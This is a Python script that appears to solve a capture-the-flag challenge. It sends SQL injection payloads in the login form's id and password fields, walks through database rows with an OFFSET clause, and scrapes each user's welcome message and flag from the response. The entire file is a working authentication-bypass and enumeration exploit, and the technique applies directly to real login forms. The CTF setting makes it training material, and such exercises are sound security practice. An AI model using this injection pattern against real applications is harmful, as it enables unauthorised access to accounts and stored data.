import requests
import re


def get_user_flag(user):
    url = "https://hollywood.chall.necst.it"

    for i in range(10_000):
        data = {
            "id": "')OR",
            "username": f"{user}",
            "password": f"IS NOT NULL OR TRUE ORDER BY usrn OFFSET {i} ROWS;--",
        }

        response = requests.post(url, data=data)
        content = response.text

        if "Welcome" not in content:
            print(f"[-] Aucun résultat à l'offset {i}")
            break

        user_match = re.search(r"Welcome, ([^<]+)!", content)
        flag_match = re.search(r"Your flag is: ([^<]+)</h3>", content)

        if user_match and flag_match:
            username = user_match.group(1)
            flag = flag_match.group(1)
            if username == user:
                return flag
        else:
            print(f"[!] Format inattendu à l'offset {i}")
            break

    return None


if __name__ == "__main__":
    user = input("Entrez le nom d'utilisateur: ").strip()
    flag = get_user_flag(user)
    if flag:
        print(f"✅ Flag pour {user}: {flag}")
    else:
        print(f"❌ Flag pour {user} non trouvé.")
